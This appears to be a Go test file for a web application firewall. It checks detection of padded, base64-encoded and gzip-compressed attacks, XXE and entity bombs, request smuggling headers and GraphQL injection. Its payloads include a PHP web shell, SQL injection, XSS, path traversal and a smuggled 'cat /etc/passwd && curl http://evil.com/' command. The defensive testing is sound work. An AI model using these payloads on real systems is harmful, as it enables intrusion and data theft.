		".c2lnbmF0dXJl_x1-Y2"

	cases := []struct {
		name    string
		target  string
		headers map[string]string
		args    map[string]string
	}{
		{"websocket upgrade", "/ws", map[string]string{
			"Upgrade": "websocket", "Connection": "Upgrade",
			"Sec-WebSocket-Key":        "dGhlIHNhbXBsZSBub25jZQ==",
			"Sec-WebSocket-Version":    "13",
			"Sec-WebSocket-Protocol":   "graphql-transport-ws, json",
			"Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
			"Origin":                   "https://app.example.com",
		}, nil},
		{"websocket token in query", "/ws", map[string]string{
			"Upgrade": "websocket", "Connection": "Upgrade",
			"Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
		}, map[string]string{"token": longToken}},
		{"sse", "/v1/events", map[string]string{
			"Accept": "text/event-stream", "Cache-Control": "no-cache",
			"Last-Event-ID": "42",
		}, nil},
		{"sse token in query", "/v1/events", map[string]string{
			"Accept": "text/event-stream",
		}, map[string]string{"access_token": longToken}},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("GET", tt.target, "HTTP/1.1")
			for k, v := range tt.headers {
				tx.AddRequestHeader(k, v)
			}
			for k, v := range tt.args {
				tx.AddArgument(k, v)
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Errorf("blocked: rule=%d msg=%q reason=%v detail=%q",
					d.RuleID(), d.Message(), d.Reason(), d.Detail())
			}
		})
	}
}

// TestPayloadPastValueLimitIsNotSkipped is the regression test for a real
// bypass: values over the per-value ceiling used to be silently truncated, so a
// payload placed after enough padding was never inspected and the request was
// reported clean.
//
// docs/PERFORMANCE.md §4 forbids exactly this — "half-inspection is
// indistinguishable from a bypass" — and the code was doing it anyway.
func TestPayloadPastValueLimitIsNotSkipped(t *testing.T) {
	w := newWAF(t)
	payload := "1' OR 1=1-- UNION SELECT password FROM users"

	for _, pad := range []int{1 << 10, 64 << 10, 200 << 10, 1 << 20} {
		t.Run(fmt.Sprintf("pad=%dKiB", pad>>10), func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("GET", "/search", "HTTP/1.1")
			tx.AddArgument("q", strings.Repeat("A", pad)+payload)

			d := tx.ProcessRequestHeaders()
			if !d.Blocked() {
				t.Errorf("payload after %d bytes of padding was not inspected — "+
					"prepending filler must not hide a payload", pad)
			}
		})
	}
}

// TestOversizeValueIsReportedNotTruncated checks the other half: a value gwaf
// genuinely will not inspect is a decision, so the deployment's fail mode
// applies rather than the request being reported clean.
func TestOversizeValueIsReportedNotTruncated(t *testing.T) {
	w := newWAF(t, gwaf.WithLimits(gwaf.Limits{MaxValueLen: 1024}))

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("GET", "/search", "HTTP/1.1")
	tx.AddArgument("q", strings.Repeat("a", 4096))

	d := tx.ProcessRequestHeaders()
	if !d.Blocked() {
		t.Error("an uninspected value was reported as clean")
	}
	if d.Reason() != gwaf.ReasonLimit {
		t.Errorf("Reason() = %v, want ReasonLimit", d.Reason())
	}
	if d.Detail() == "" {
		t.Error("no detail explaining which value was too large")
	}
}

// TestBase64EncodedPayloadsAreDecoded covers the encoded-upload path.
//
// Base64 is encoded binary: inspecting it as prose costs a great deal and finds
// nothing, and skipping it is a coverage hole because the origin decodes it.
// A base64-encoded web shell inside a JSON field is a real technique.
func TestBase64EncodedPayloadsAreDecoded(t *testing.T) {
	w := newWAF(t)

	payloads := []string{
		"<?php system($_GET['cmd']); ?> and some padding to make it long enough",
		"<script>alert(document.cookie)</script> plus padding text for length",
		"1 UNION SELECT password FROM users WHERE id=1 -- padding text here",
		"'; DROP TABLE users; -- padding to reach a reasonable length here",
		"x; cat /etc/passwd && curl http://evil.com/ -- padding for length",
	}

	for _, p := range payloads {
		t.Run(p[:min(len(p), 30)], func(t *testing.T) {
			enc := base64.StdEncoding.EncodeToString([]byte(p))

			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/v1/certs/upload", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(`{"filename":"x.txt","data":"` + enc + `"}`))

			if d := tx.ProcessRequestBody(); !d.Blocked() {
				t.Errorf("base64-encoded payload was not decoded and inspected: %q", p)
			}
		})
	}
}

// TestBase64BodiesAreCheap guards the cost side. Before decoding, a 700 KiB
// base64 field burned 20 million fuel — 62% of the default budget — for one
// upload, because the detectors were reading encoded binary as prose.
func TestBase64BodiesAreCheap(t *testing.T) {
	w := newWAF(t)

	raw := make([]byte, 256<<10)
	for i := range raw {
		raw[i] = byte(i*7 + i/251)
	}
	enc := base64.StdEncoding.EncodeToString(raw)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/v1/certs/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(`{"data":"` + enc + `"}`))

	if d := tx.ProcessRequestBody(); d.Blocked() {
		t.Fatalf("benign base64 upload blocked: rule=%d", d.RuleID())
	}

	// Generous, but far below the ~7.3M this cost before decoding.
	const maxFuel = 500_000
	if got := tx.FuelSpent(); got > maxFuel {
		t.Errorf("a %d KiB base64 upload cost %d fuel, want under %d — "+
			"encoded binary is being read as prose again",
			len(enc)>>10, got, maxFuel)
	}
}

// ---- transport shapes: compression, framing, XML ---------------------------

func gzipBytes(t *testing.T, s string) []byte {
	t.Helper()
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	if _, err := w.Write([]byte(s)); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// TestCompressedBodiesAreDecoded is the regression test for a total bypass.
//
// A compressed body is opaque: there is no grammar in a DEFLATE stream, so
// every detector found nothing and the request was reported clean while the
// origin decompressed it and acted on the payload. The entire firewall was
// switched off by one header, and the same payload sent plainly was blocked.
func TestCompressedBodiesAreDecoded(t *testing.T) {
	w := newWAF(t)

	payloads := []string{
		`{"q":"1 UNION SELECT password FROM users"}`,
		`{"c":"<script>alert(document.cookie)</script>"}`,
		`{"p":"../../etc/passwd"}`,
	}

	for _, p := range payloads {
		t.Run(p[:min(len(p), 28)], func(t *testing.T) {
			for _, declared := range []bool{true, false} {
				name := "declared"
				if !declared {
					// An origin that sniffs decompresses a body whose header
					// says nothing, and gwaf does not know whether this one
					// does. Both readings are evaluated.
					name = "undeclared"
				}
				t.Run(name, func(t *testing.T) {
					tx := w.NewTransaction()
					defer tx.Close()

					tx.SetRequestLine("POST", "/api", "HTTP/1.1")
					tx.AddRequestHeader("Content-Type", "application/json")
					if declared {
						tx.AddRequestHeader("Content-Encoding", "gzip")
					}
					tx.ProcessRequestHeaders()
					tx.SetRequestBody(gzipBytes(t, p))

					if d := tx.ProcessRequestBody(); !d.Blocked() {
						t.Errorf("payload inside a gzip body was not inspected: %s", p)
					}
				})
			}
		})
	}
}

func TestBenignCompressedBodiesPass(t *testing.T) {
	w := newWAF(t)

	for _, p := range []string{
		`{"name":"Alice","qty":3,"note":"please deliver before 5pm"}`,
		`{"data":"` + strings.Repeat("ordinary content ", 5000) + `"}`,
		`{"c":"use the <b>bold</b> tag"}`,
	} {
		t.Run(p[:min(len(p), 28)], func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.AddRequestHeader("Content-Encoding", "gzip")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody(gzipBytes(t, p))

			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("benign gzip body blocked: rule=%d reason=%v detail=%q",
					d.RuleID(), d.Reason(), d.Detail())
			}
		})
	}
}

// TestUndecodableEncodingIsNotClean covers the encodings gwaf cannot undo.
//
// Brotli needs a third-party library the core module will not carry, so a
// brotli body cannot be inspected. Passing it through would restore the bypass
// exactly — one header, and the firewall is off — so it is reported instead and
// the deployment's fail mode decides.
func TestUndecodableEncodingIsNotClean(t *testing.T) {
	w := newWAF(t)

	for _, enc := range []string{"br", "brotli", "exotic", "gzip, br"} {
		t.Run(enc, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.AddRequestHeader("Content-Encoding", enc)
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte("\x1b\x3f\x00\x00\x24\xb0\xe2\x99\x80\x12"))

			d := tx.ProcessRequestBody()
			if !d.Blocked() {
				t.Errorf("an undecodable body was reported clean")
			}
			if d.Reason() != gwaf.ReasonUndecidable {
				t.Errorf("Reason() = %v, want ReasonUndecidable", d.Reason())
			}
		})
	}
}

// TestDecompressionBombIsBounded checks that a small request cannot become a
// large allocation. Ratios of a thousand to one are ordinary and crafted
// streams reach far higher.
func TestDecompressionBombIsBounded(t *testing.T) {
	w := newWAF(t)

	bomb := gzipBytes(t, strings.Repeat("\x00", 8<<20))
	if len(bomb) > 64<<10 {
		t.Fatalf("test bomb is %d bytes, expected a small one", len(bomb))
	}

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/api", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.AddRequestHeader("Content-Encoding", "gzip")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody(bomb)

	d := tx.ProcessRequestBody()
	if !d.Blocked() {
		t.Error("a decompression bomb was accepted")
	}
	if !strings.Contains(d.Detail(), "exceeds limit") {
		t.Errorf("Detail() = %q, want it to name the size limit", d.Detail())
	}
}

// TestFramingAmbiguityIsRejected is request smuggling.
//
// An attacker sends a request whose length one server computes from
// Content-Length and another from Transfer-Encoding. The two disagree about
// where it ends, and the bytes past the boundary become the start of a
// *different* request the front end never inspected. No rule can catch it: by
// the time rules run, gwaf is already looking at whichever request it happened
// to reconstruct.
//
// docs/CONCEPT.md §11 specified this and it was never built until a probe
// showed a CL.TE conflict passing cleanly.
func TestFramingAmbiguityIsRejected(t *testing.T) {
	w := newWAF(t)

	cases := []struct {
		name    string
		headers [][2]string
	}{
		{"CL and TE together", [][2]string{
			{"Content-Length", "6"}, {"Transfer-Encoding", "chunked"}}},
		{"TE with leading space", [][2]string{
			{"Transfer-Encoding", " chunked"}}},
		{"TE with trailing tab", [][2]string{
			{"Transfer-Encoding", "chunked\t"}}},
		{"non-numeric CL", [][2]string{
			{"Content-Length", "6, 6"}}},
		{"CL with units", [][2]string{
			{"Content-Length", "6 bytes"}}},
		{"conflicting CL values", [][2]string{
			{"Content-Length", "6"}, {"Content-Length", "12"}}},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
			for _, h := range tt.headers {
				tx.AddRequestHeader(h[0], h[1])
			}

			d := tx.ProcessRequestHeaders()
			if !d.Blocked() {
				t.Errorf("ambiguous framing accepted: %v", tt.headers)
			}
			if d.Reason() != gwaf.ReasonDesync {
				t.Errorf("Reason() = %v, want ReasonDesync", d.Reason())
			}
		})
	}
}

func TestUnambiguousFramingIsAccepted(t *testing.T) {
	w := newWAF(t)

	cases := []struct {
		name    string
		headers [][2]string
	}{
		{"content-length only", [][2]string{{"Content-Length", "7"}}},
		{"transfer-encoding only", [][2]string{{"Transfer-Encoding", "chunked"}}},
		{"repeated identical CL", [][2]string{
			{"Content-Length", "7"}, {"Content-Length", "7"}}},
		{"neither", nil},
		{"TE gzip chunked", [][2]string{{"Transfer-Encoding", "gzip, chunked"}}},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
			for _, h := range tt.headers {
				tx.AddRequestHeader(h[0], h[1])
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Errorf("unambiguous framing rejected: %v reason=%v detail=%q",
					tt.headers, d.Reason(), d.Detail())
			}
		})
	}
}

// TestXMLEntityAttacks covers XXE and expansion bombs, and the SOAP traffic
// that must keep working alongside them.
func TestXMLEntityAttacks(t *testing.T) {
	w := newWAF(t)

	attacks := []struct{ name, body string }{
		{"XXE file", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
		{"XXE remote", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/x">]><foo>&xxe;</foo>`},
		{"billion laughs", `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>`},
		{"parameter entity", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/e">%remote;]><r/>`},
		{"sqli in element", `<?xml version="1.0"?><order><id>1 UNION SELECT password FROM users</id></order>`},
	}
	for _, a := range attacks {
		t.Run(a.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()
			tx.SetRequestLine("POST", "/svc", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/xml")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(a.body))
			if d := tx.ProcessRequestBody(); !d.Blocked() {
				t.Errorf("XML attack not detected: %s", a.name)
			}
		})
	}

	benign := []struct{ name, body, ctype string }{
		{"soap envelope", `<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">` +
			`<soap:Body><GetOrder xmlns="urn:orders"><OrderId>12345</OrderId>` +
			`<Note>please deliver before 5pm</Note></GetOrder></soap:Body></soap:Envelope>`,
			"text/xml; charset=utf-8"},
		{"plain xml", `<?xml version="1.0"?><order><id>1</id><customer>O'Brien</customer><total>42.00</total></order>`,
			"application/xml"},
		{"xml with doctype", `<?xml version="1.0"?><!DOCTYPE html><html><body><p>text</p></body></html>`,
			"application/xhtml+xml"},
	}
	for _, b := range benign {
		t.Run(b.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()
			tx.SetRequestLine("POST", "/svc", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", b.ctype)
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(b.body))
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("benign XML blocked: rule=%d msg=%q", d.RuleID(), d.Message())
			}
		})
	}
}

// TestGraphQLTrafficPasses covers queries, subscriptions, and introspection,
// alongside injection through a GraphQL argument.
func TestGraphQLTrafficPasses(t *testing.T) {
	w := newWAF(t)

	benign := []string{
		`{"query":"query GetOrders($first:Int!){ orders(first:$first){ id total } }","variables":{"first":10}}`,
		`{"id":"1","type":"subscribe","payload":{"query":"subscription { orderUpdated { id status } }"}}`,
		`{"query":"{ __schema { types { name fields { name } } } }"}`,
		`{"query":"mutation { createOrder(input:{sku:\"SKU-1\",qty:2}){ id } }"}`,
	}
	for _, q := range benign {
		t.Run(q[:min(len(q), 30)], func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()
			tx.SetRequestLine("POST", "/graphql", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(q))
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("benign GraphQL blocked: rule=%d msg=%q", d.RuleID(), d.Message())
			}
		})
	}

	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRequestLine("POST", "/graphql", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(`{"query":"{ user(id:\"1' OR 1=1--\"){ name } }"}`))
	if d := tx.ProcessRequestBody(); !d.Blocked() {
		t.Error("injection through a GraphQL argument was not detected")
	}
}

// TestProtocolVersionsAllPass checks that no protocol-conformance assumption
// crept in. HTTP/2 and HTTP/3 carry no Content-Length and no Accept header by
// default, which is what breaks CRS-derived rulesets.
func TestProtocolVersionsAllPass(t *testing.T) {
	w := newWAF(t)

	for _, proto := range []string{"HTTP/1.0", "HTTP/1.1", "HTTP/2.0", "HTTP/3.0"} {
		t.Run(proto, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()
			tx.SetRequestLine("GET", "/api/v1/orders/12345", proto)
			tx.AddRequestHeader("User-Agent", "Mozilla/5.0")
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Errorf("%s blocked: rule=%d", proto, d.RuleID())
			}
		})
	}
}
